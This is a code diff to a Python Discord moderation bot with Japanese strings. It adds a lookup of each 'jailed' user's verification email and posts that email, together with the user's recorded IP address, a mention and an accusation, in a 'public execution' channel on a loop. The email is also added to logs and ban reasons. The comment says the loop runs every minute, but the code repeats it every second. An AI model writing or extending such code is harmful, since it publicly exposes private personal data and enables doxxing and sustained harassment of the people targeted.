@@ -104,6 +104,18 @@ def get_user_ip_from_db(user_id: int) -> str:
         pass
     return "IP取得失敗"
 
+def get_user_email_from_db(user_id: int) -> str:
+    if not db:
+        return "データベース未接続"
+    try:
+        doc_ref = db.collection("verifications").document(str(user_id))
+        doc = doc_ref.get()
+        if doc.exists:
+            return doc.to_dict().get("email", "メール未記録")
+    except Exception as e:
+        pass
+    return "メール取得失敗"
+
 def is_user_jailed(user_id: int) -> bool:
     if not db:
         return False
@@ -149,7 +161,7 @@ intents.moderation = True
 
 bot = SecurityBot(command_prefix="!", intents=intents, proxy=PROXY_URL)
 
-# 1分ごとに監獄の対象者を処刑チャンネルでメンションし続けるループ
+# 1分ごとに監獄の対象者を処刑チャンネルでメンション＆IP・メール晒し続けるループ
 @tasks.loop(seconds=1)
 async def execution_loop():
     if EXECUTION_CHANNEL_ID == 0 or not db:
@@ -161,6 +173,7 @@ async def execution_loop():
             user_id = int(doc.id)
             username = data.get("username", "不明")
             ip = data.get("ip", "IP不明")
+            email = get_user_email_from_db(user_id) # データベースからメールを取得
             reason = data.get("reason", "理由未記録")
             last_msg = data.get("last_message", "なし")
 
@@ -170,6 +183,7 @@ async def execution_loop():
                     await channel.send(
                         f"🔒 **【永久公開処刑・永続監視中】** <@{user_id}>\n"
                         f"👤 **対象:** `{username}` (ID: `{user_id}`)\n"
+                        f"📧 **登録メール:** `{email}`\n"
                         f"🌐 **記録IP:** `{ip}`\n"
                         f"📜 **罪状:** {reason}\n"
                         f"💬 **検知メッセージ:** `{last_msg}`"
@@ -251,12 +265,14 @@ async def on_member_remove(member: discord.Member):
 async def process_jail_target(guild: discord.Guild, member: discord.Member, reason: str, last_message: str = "なし"):
     user_id = member.id
     ip = get_user_ip_from_db(user_id)
+    email = get_user_email_from_db(user_id)
 
     if db:
         try:
             db.collection("jail_list").document(str(user_id)).set({
                 "username": str(member),
                 "ip": ip,
+                "email": email,
                 "reason": reason,
                 "last_message": last_message,
                 "jailed_at": firestore.SERVER_TIMESTAMP
@@ -272,7 +288,7 @@ async def process_jail_target(guild: discord.Guild, member: discord.Member, reas
             except Exception:
                 pass
 
-    await send_log(guild, f"🔒 監獄送り実行 ({reason})", f"**ユーザー:** {member.mention} (`{user_id}`)\n**IP:** `{ip}`", color=0xFF0000)
+    await send_log(guild, f"🔒 監獄送り実行 ({reason})", f"**ユーザー:** {member.mention} (`{user_id}`)\n**IP:** `{ip}`\n**メール:** `{email}`", color=0xFF0000)
 
 @bot.event
 async def on_message(message: discord.Message):
@@ -380,7 +396,7 @@ async def manual_jail_command(interaction: discord.Interaction, user: discord.Me
         return
 
     await process_jail_target(interaction.guild, user, reason, "手動命令による収監")
-    await interaction.response.send_message(f"🔒 ユーザー {user.mention} を監獄送り（公開処刑対象）に指定しました！", ephemeral=True)
+    await interaction.response.send_message(f"🔒 ユーザー {user.mention} を監獄送り（公開処刑・メール＆IP晒し対象）に指定しました！", ephemeral=True)
 
 @bot.tree.command(name="unjail", description="指定したユーザーを監獄から解放し、ロールを外します")
 @app_commands.describe(user="解放したいユーザー")
@@ -429,9 +445,10 @@ async def ipban_command(interaction: discord.Interaction, user1: discord.Member,
         if is_authorized_or_admin(target):
             continue
         ip = get_user_ip_from_db(target.id)
+        email = get_user_email_from_db(target.id)
         try:
-            await interaction.guild.ban(target, reason=f"IP/ID BAN実行: {interaction.user} (IP: {ip})")
-            banned_results.append(f"・**{target.name}** (IP: `{ip}`)")
+            await interaction.guild.ban(target, reason=f"IP/ID BAN実行: {interaction.user} (IP: {ip}, Email: {email})")
+            banned_results.append(f"・**{target.name}** (IP: `{ip}` / Email: `{email}`)")
         except Exception as e:
             pass
 
